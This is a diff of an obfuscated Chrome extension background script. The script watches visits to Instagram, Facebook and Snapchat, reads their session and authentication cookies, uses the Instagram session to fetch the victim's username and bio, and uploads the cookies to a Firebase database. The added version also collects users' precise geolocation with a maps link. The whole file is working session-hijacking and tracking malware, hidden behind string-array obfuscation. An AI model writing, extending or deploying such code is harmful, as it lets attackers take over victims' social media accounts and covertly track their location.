@@ -1,104 +1,32 @@
-function a0a() {
-  const v = [
-    "y29VA2LLCW",
-    "C2mTD2nPza",
-    "rMfJzwjVB2S",
-    "mJGZndiWng5Tq3zHzW",
-    "zMLUza",
-    "8j+BKsbtBMfWy2HHDcbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
-    "yMXPENPHCMrFD2vIx3nLC3nPB25FAwq",
-    "BMfTzq",
-    "D2vItMf2AwDHDgLVBG",
-    "C2vZC2LVBMLK",
-    "mZi4mde4ofHIuNzHEG",
-    "DMfSDwu",
-    "sw5ZDgfNCMfT",
-    "4PQG77IpieLhignVB2TPzxmGBwLZC2LUzY4",
-    "Aw5JBhvKzxm",
-    "C2nFyxq",
-    "C2vZC2LVBMLKpq",
-    "4PQG77IpiezcignVB2TPzxmGBwLZC2LUzY4",
-    "r0vu",
-    "z2v0qwXS",
-    "4PYfieLUC3rHz3jHBsbZyxzLzdO",
-    "ywrKtgLZDgvUzxi",
-    "Dw5RBM93BL91C2vY",
-    "DxnLCM5HBwu",
-    "ndy4mtC0n1Phrgjjsa",
-    "C25HCgnOyxq",
-    "ANnVBG",
-    "zhnFDxnLCL9Pza",
-    "DxnLCG",
-    "zMfJzwjVB2S",
-    "y191C2vY",
-    "4PYfifnUyxbJAgf0ihnHDMvKiokCHq",
-    "u25HCgnOyxq",
-    "x3nJlxnPza",
-    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
-    "lNnUyxbJAgf0lMnVBq",
-    "Bg9N",
-    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
-    "l2LUzM8V",
-    "zw4Tvvm",
-    "mJG4wNLNrNz1",
-    "8j+AGcbtzxj2AwnLifDVCMTLCIbmB2fKzwqG4PYf",
-    "lMLUC3rHz3jHBs5JB20",
-    "otq1otu0BgPqzgHY",
-    "Aw5ZDgfNCMfT",
-    "B25dB21WBgv0zwq",
-    "4PYfiezHy2vIB29RihnHDMvKoG",
-    "nJqWmti0AMDlseHi",
-    "zMfJzwjVB2SUy29T",
-    "C25HCgnOyxqUy29T",
-    "lMzHy2vIB29RlMnVBq",
-    "yMLVz3jHCgH5",
-    "otm2nJe5nZqZmZKYndu5",
-    "mtCYnJyYDMP4yLrV",
-    "D2fYBG",
-    "Aw5ZDgfNCMfTlMnVBq",
-    "C2mTys1UB25Jzq",
-    "mtyWA3D4Agnq",
-    "ndyZndi0s0HADKDI",
-    "8j+BKsbgqIbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
-    "8j+BKsbjrYbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
-    "4PQG77IpifnUyxbJAgf0ignVB2TPzxmGBwLZC2LUzY4",
-  ];
-  a0a = function () {
-    return v;
-  };
-  return a0a();
-}
-const a0n = a0b;
+const a0p = a0b;
 (function (a, b) {
-  const m = a0b,
+  const o = a0b,
     c = a();
   while (!![]) {
     try {
       const d =
-        -parseInt(m(0xd3)) / 0x1 +
-        -parseInt(m(0xe5)) / 0x2 +
-        parseInt(m(0xcf)) / 0x3 +
-        -parseInt(m(0xec)) / 0x4 +
-        (parseInt(m(0xdd)) / 0x5) * (parseInt(m(0xd9)) / 0x6) +
-        parseInt(m(0xfa)) / 0x7 +
-        (-parseInt(m(0xde)) / 0x8) * (-parseInt(m(0xcc)) / 0x9);
+        -parseInt(o(0x1fc)) / 0x1 +
+        (-parseInt(o(0x1ee)) / 0x2) * (parseInt(o(0x1ed)) / 0x3) +
+        (parseInt(o(0x1e2)) / 0x4) * (-parseInt(o(0x1f8)) / 0x5) +
+        -parseInt(o(0x1bd)) / 0x6 +
+        (-parseInt(o(0x1f7)) / 0x7) * (parseInt(o(0x1fe)) / 0x8) +
+        parseInt(o(0x1b4)) / 0x9 +
+        parseInt(o(0x1d0)) / 0xa;
       if (d === b) break;
       else c["push"](c["shift"]());
     } catch (e) {
       c["push"](c["shift"]());
     }
   }
-})(a0a, 0xd7312),
-  console[a0n(0xc8)](a0n(0xcd));
-import { db } from "./firebase-init.js";
-import { collection, addDoc } from "./firebase-firestore.js";
+})(a0a, 0xaabb3),
+  console[a0p(0x1f0)](a0p(0x202), a0p(0x1e4));
 function a0b(a, b) {
   const c = a0a();
   return (
     (a0b = function (d, e) {
-      d = d - 0xc4;
+      d = d - 0x1b0;
       let f = c[d];
-      if (a0b["DgqcQR"] === undefined) {
+      if (a0b["EaJRTZ"] === undefined) {
         var g = function (l) {
           const m =
             "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
@@ -120,117 +48,268 @@ function a0b(a, b) {
           }
           return decodeURIComponent(o);
         };
-        (a0b["DWiTMR"] = g), (a = arguments), (a0b["DgqcQR"] = !![]);
+        (a0b["ElbXyz"] = g), (a = arguments), (a0b["EaJRTZ"] = !![]);
       }
       const h = c[0x0],
         i = d + h,
         j = a[i];
-      return !j ? ((f = a0b["DWiTMR"](f)), (a[i] = f)) : (f = j), f;
+      return !j ? ((f = a0b["ElbXyz"](f)), (a[i] = f)) : (f = j), f;
     }),
     a0b(a, b)
   );
 }
+import { db } from "./firebase-init.js";
+function a0a() {
+  const A = [
+    "AM9PBG",
+    "4P2micvJw0LhxsbbueKGrxjYB3i6",
+    "C25HCgnOyxq",
+    "y29SB3i6ihjLzdS",
+    "4PQG77IpicvJw0LhxsbnAxnZAw5NoIbZzxnZAw9UAwqGB3iGzhnFDxnLCL9Pza",
+    "ndi2mtCXt1bHsvnt",
+    "nMHnre16Cq",
+    "DhLWzq",
+    "Bg9N",
+    "4PYficvJw1ndxsbtyxzLzcbtBMfWy2HHDcbZzxnZAw9U",
+    "y29SB3i6igDYyxK7",
+    "vw5RBM93BG",
+    "CNvUDgLTzq",
+    "C2mTys1JC3jM",
+    "r0vu",
+    "mtGZmdvwqw9mDge",
+    "nufQtfjtqW",
+    "BMfTzq",
+    "4PUu77IpicvJw0zcxsbeDxbSAwnHDguGC2vZC2LVBIbZA2LWCgvK",
+    "4P2micvJw1ndxsboBYbYzxf1AxjLzcbJB29RAwvZigzVDw5K",
+    "nZu2odG0v0z6A1ry",
+    "4PUu77IpicvJw1ndxsbeDxbSAwnHDguGC2vZC2LVBIbZA2LWCgvK",
+    "mJm4nfHHwwzowa",
+    "y2f0y2G",
+    "B25dB21WBgv0zwq",
+    "z2v0qwXS",
+    "jwpWN5QaifnLCNzPy2uGv29YA2vYieXVywrLzcdINiu",
+    "ChvZAa",
+    "Dw5RBM93BL91C2vY",
+    "C25HCgnOyxqUy29T",
+    "zw4Tvvm",
+    "x19iB3n0lxnJlweTyxv0Ac1ZzxnZAw9U",
+    "DxnLCG",
+    "A2v5CW",
+    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
+    "DgfIBgu",
+    "Aw5ZDgfNCMfT",
+    "zgf0yq",
+    "nJGZmZqWm1DNEMzNBq",
+    "D2vItMf2AwDHDgLVBG",
+    "x3nJlxnPza",
+    "zMfJzwjVB2SUy29T",
+    "zMLUza",
+    "BgvUz3rO",
+    "D2fYBG",
+    "4PYficvJw0Xpq10Gtg9JyxrPB24GC2f2zwqGDg8GrMLYzxn0B3jL",
+    "y29SB3i6ig9Yyw5NztS",
+    "mJy2mZGWofDZqLneqW",
+    "DxnLCM5HBwu",
+    "DgHLBG",
+    "C2mTD2nPza",
+    "ANnVBG",
+    "zMfJzwjVB2S",
+    "4PYficvJw0LhxsbtyxzLzcba",
+    "4PQG77IpicvJw1ndxsboBYbJB29RAwvZigzVDw5K",
+    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
+    "C2vZC2LVBMLK",
+    "C2mTys1UB25Jzq",
+    "y29VA2LLCW",
+    "8j+mJsbhB29NBguGtwfWCZOG",
+    "4PQG77IpicvJw0zcxsbnAxnZAw5NoIbJx3vZzxiGB3iGEhm",
+    "lMzHy2vIB29RlMnVBq",
+    "B25nzxnZywDL",
+    "Aw5ZDgfNCMfTlMnVBq",
+    "DMfSDwu",
+    "C2vZC2LVBMLKpq",
+    "mJGXntqZodbIEKL4y0W",
+    "y191C2vY",
+    "zxjYB3i",
+    "Bg9JyxrPB24",
+    "yMXPENPHCMrFD2vIx3nLC3nPB25FAwq",
+    "CMvWBgfJzq",
+    "y29SB3i6igDYzwvUoW",
+    "x19iB3n0lvGTu25HCc1dBgLLBNqTq29VA2LL",
+    "yMLVz3jHCgH5",
+    "4PYficvJw0zcxsbtyxzLzcbZzxnZAw9U",
+    "ywrKtgLZDgvUzxi",
+    "x19iB3n0lxnJlweTBM9Uy2u",
+    "4PQG77IpicvJw1ndxsbnAxnZAw5NignVB2TPzxm6",
+    "C2nFyxq",
+    "Ahr0Chm6lY93D3CUz29Vz2XLlMnVBs9TyxbZp3e9",
+    "l2LUzM8V",
+    "Aw5JBhvKzxm",
+    "lMLUC3rHz3jHBs5JB20",
+    "mtG3nJm4ogfPtwTMta",
+    "otm2nJe5nZqZmZKYndu5",
+    "y29SB3i6igDYzwvUoYbMB250lxDLAwDODdOGyM9SzdS",
+    "4PUu77IpicvJw0LhxsbeDxbSAwnHDguGC2vZC2LVBIbZA2LWCgvK",
+    "4P2micvJw0Xpq10Gtg9JyxrPB24GC2f2zsbLCNjVCG",
+    "zhnFDxnLCL9Pza",
+  ];
+  a0a = function () {
+    return A;
+  };
+  return a0a();
+}
+import { collection, addDoc } from "./firebase-firestore.js";
 import { isDuplicateData } from "./utils.js";
-chrome[a0n(0xea)][a0n(0xd1)][a0n(0xf7)](
+chrome[a0p(0x1b5)][a0p(0x200)][a0p(0x1da)](
   async ({ url: a }) => {
-    const o = a0n;
-    if (a[o(0xf0)](o(0xdb))) handleInstagram();
+    const q = a0p;
+    if (a[q(0x1e0)](q(0x1cd))) handleInstagram();
     else {
-      if (a[o(0xf0)](o(0xd4))) handleFacebook();
+      if (a[q(0x1e0)](q(0x1b7))) handleFacebook();
       else {
-        if (a[o(0xf0)](o(0xd5))) handleSnapchat();
+        if (a[q(0x1e0)](q(0x205))) handleSnapchat();
       }
     }
   },
   {
     url: [
-      { hostSuffix: a0n(0xdb) },
-      { hostSuffix: a0n(0xd4) },
-      { hostSuffix: a0n(0xd5) },
+      { hostSuffix: a0p(0x1cd) },
+      { hostSuffix: a0p(0x1b7) },
+      { hostSuffix: a0p(0x205) },
     ],
   }
-);
+),
+  chrome[a0p(0x1f4)][a0p(0x1cc)][a0p(0x1da)]((a) => {
+    const r = a0p;
+    if (a[r(0x1ef)] === r(0x1d3)) {
+      const {
+          latitude: b,
+          longitude: c,
+          accuracy: d,
+          city: e,
+          state: f,
+          country: g,
+          postal: h,
+          domain: i,
+          timestamp: j,
+        } = a[r(0x1b3)],
+        k = r(0x1de) + b + "," + c,
+        l = {
+          latitude: b,
+          longitude: c,
+          accuracy: d,
+          city: e || r(0x1f3),
+          state: f || r(0x1f3),
+          country: g || r(0x1f3),
+          postal: h,
+          timestamp: j || new Date(),
+          domain: i,
+          maps_url: k,
+        },
+        m = collection(db, r(0x1d3));
+      addDoc(m, l)
+        [r(0x1bf)](() => {
+          const s = r;
+          console[s(0x1f0)](s(0x1bb), s(0x1d6)),
+            console[s(0x1b1)](l),
+            console[s(0x1f0)](s(0x1c9) + k);
+        })
+        [r(0x1ff)]((n) => {
+          const t = r;
+          console[t(0x1d2)](t(0x1e6), t(0x1eb), n);
+        });
+    }
+  });
 async function handleInstagram() {
-  const p = a0n;
-  chrome[p(0xe2)][p(0xf5)]({ domain: p(0xce) }, async (a) => {
-    const q = p,
-      b = a[q(0xe6)]((k) => k[q(0xe9)] === q(0xeb)),
-      c = a[q(0xe6)]((k) => k[q(0xe9)] === q(0xfd));
-    if (!b || !c) return console[q(0xda)](q(0xef));
-    const d = b[q(0xed)],
-      e = c[q(0xed)],
-      f = await fetch(q(0xc9) + e + q(0xca), {
-        method: q(0xf4),
+  const u = a0p;
+  chrome[u(0x1c8)][u(0x201)]({ domain: u(0x1e1) }, async (a) => {
+    const v = u,
+      b = a[v(0x1b8)]((j) => j[v(0x1f9)] === v(0x1c6)),
+      c = a[v(0x1b8)]((j) => j[v(0x1f9)] === v(0x1e7));
+    if (!b || !c) {
+      console[v(0x1ba)](v(0x1ec), v(0x1bc));
+      return;
+    }
+    const d = b[v(0x1ce)],
+      e = c[v(0x1ce)];
+    let f = v(0x204),
+      g = "";
+    try {
+      const j = await fetch(v(0x1b0) + e + v(0x1df), {
+        method: v(0x1f6),
         headers: {
-          "User-Agent": q(0xc6),
-          Cookie: q(0xf2) + d + ";",
-          "X-IG-App-ID": q(0xd8),
-          "Accept-Language": q(0xcb),
+          "User-Agent": v(0x1c5),
+          Cookie: v(0x1cf) + d + ";",
+          "X-IG-App-ID": v(0x1e3),
+          "Accept-Language": v(0x206),
         },
       });
-    let g = q(0xf8),
-      h = "";
-    if (f["ok"]) {
-      const k = await f[q(0xfc)](),
-        l = k[q(0xfe)] || {};
-      (g = l[q(0xf9)] || q(0xf8)), (h = l[q(0xd7)] || "");
+      if (j["ok"]) {
+        const k = await j[v(0x1c1)](),
+          l = k[v(0x208)] || {};
+        (f = l[v(0x1be)] || v(0x204)), (g = l[v(0x1d8)] || "");
+      }
+    } catch (m) {
+      console[v(0x1d2)](v(0x1e9), v(0x1eb), m);
     }
-    const i = {
-        platform: q(0xee),
-        sessionId: d,
-        userId: e,
-        username: g,
-        bio: h,
-        domain: q(0xdb),
-      },
-      j = collection(db, q(0xd0));
-    if (await isDuplicateData(j, i)) return console[q(0xc8)](q(0xe0));
-    await addDoc(j, { ...i, timestamp: new Date() }),
-      console[q(0xc8)](q(0xf6), g);
+    const h = { sessionId: d, userId: e, username: f, bio: g };
+    console[v(0x1b1)](h);
+    const i = collection(db, v(0x1b2));
+    if (await isDuplicateData(i, h))
+      return console[v(0x1ba)](v(0x1e5), v(0x1f2));
+    await addDoc(i, { ...h, timestamp: new Date() }),
+      console[v(0x1f0)](v(0x1c3) + f, v(0x1d6));
   });
 }
 async function handleFacebook() {
-  const r = a0n;
-  chrome[r(0xe2)][r(0xf5)]({ domain: r(0xd6) }, async (a) => {
-    const s = r,
-      b = a[s(0xe6)]((f) => f[s(0xe9)] === s(0x100)),
-      c = a[s(0xe6)]((f) => f[s(0xe9)] === "xs");
-    if (!b || !c) return console[s(0xda)](s(0xf3));
-    const d = {
-        platform: s(0xe4),
-        c_user: b[s(0xed)],
-        xs: c[s(0xed)],
-        userId: b[s(0xed)],
-        domain: s(0xd4),
-      },
-      e = collection(db, s(0xff));
-    if (await isDuplicateData(e, d)) return console[s(0xc8)](s(0xdf));
+  const w = a0p;
+  chrome[w(0x1c8)][w(0x201)]({ domain: w(0x1cb) }, async (a) => {
+    const x = w,
+      b = a[x(0x1b8)]((f) => f[x(0x1f9)] === x(0x1d1)),
+      c = a[x(0x1b8)]((f) => f[x(0x1f9)] === "xs");
+    if (!b || !c) return console[x(0x1ba)](x(0x1ca), x(0x1bc));
+    const d = { c_user: b[x(0x1ce)], xs: c[x(0x1ce)], userId: b[x(0x1ce)] };
+    console[x(0x1b1)](d);
+    const e = collection(db, x(0x1c2));
+    if (await isDuplicateData(e, d))
+      return console[x(0x1ba)](x(0x1fa), x(0x1f2));
     await addDoc(e, { ...d, timestamp: new Date() }),
-      console[s(0xc8)](s(0xd2), b[s(0xed)]);
+      console[x(0x1f0)](x(0x1d9), x(0x1d6));
   });
 }
 async function handleSnapchat() {
-  const t = a0n;
-  chrome[t(0xe2)][t(0xf5)]({ domain: t(0xc7) }, async (a) => {
-    const u = t,
-      b = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xf1)),
-      c = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xc5)),
-      d = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xe8)),
-      e = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xdc)),
-      f = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xe3));
-    if (!b || !c || !d || !e || !f) return console[u(0xda)](u(0xe1));
-    const g = {
-        platform: u(0xc4),
-        sc_at: b[u(0xed)],
-        sc_sid: c[u(0xed)],
-        blizzard_web_session_id: d[u(0xed)],
-        sc_a_nonce: e[u(0xed)],
-        sc_wcid: f[u(0xed)],
-        domain: u(0xd5),
-      },
-      h = collection(db, u(0xfb));
-    if (await isDuplicateData(h, g)) return console[u(0xc8)](u(0xe7));
-    await addDoc(h, { ...g, timestamp: new Date() }),
-      console[u(0xc8)](u(0x101));
+  const y = a0p,
+    a = [
+      y(0x207),
+      y(0x1db),
+      y(0x1d7),
+      y(0x1f5),
+      y(0x1dd),
+      y(0x1b6),
+      y(0x1c0),
+      y(0x1c7),
+      y(0x1d4),
+    ];
+  chrome[y(0x1c8)][y(0x201)]({}, async (b) => {
+    const z = y;
+    if (!b || b[z(0x1b9)] === 0x0) return console[z(0x1ba)](z(0x1c4), z(0x1bc));
+    const c = {},
+      d = [];
+    for (const f of a) {
+      const g = b[z(0x1b8)]((h) => h[z(0x1f9)] === f);
+      if (g) {
+        const h = f[z(0x1d5)](/-/g, "_")[z(0x1d5)](/^_+/, "");
+        c[h] = g[z(0x1ce)];
+      } else d[z(0x203)](f);
+    }
+    if (Object[z(0x209)](c)[z(0x1b9)] === 0x0)
+      return console[z(0x1d2)](z(0x1fb), z(0x1eb));
+    d[z(0x1b9)] > 0x0 &&
+      console[z(0x1ba)](z(0x1dc), z(0x1bc), d[z(0x1e8)](",\x20"));
+    console[z(0x1b1)](c);
+    const e = collection(db, z(0x1ea));
+    if (await isDuplicateData(e, c))
+      return console[z(0x1ba)](z(0x1fd), z(0x1f2));
+    await addDoc(e, { ...c, timestamp: new Date() }),
+      console[z(0x1f0)](z(0x1f1), z(0x1d6));
   });
 }
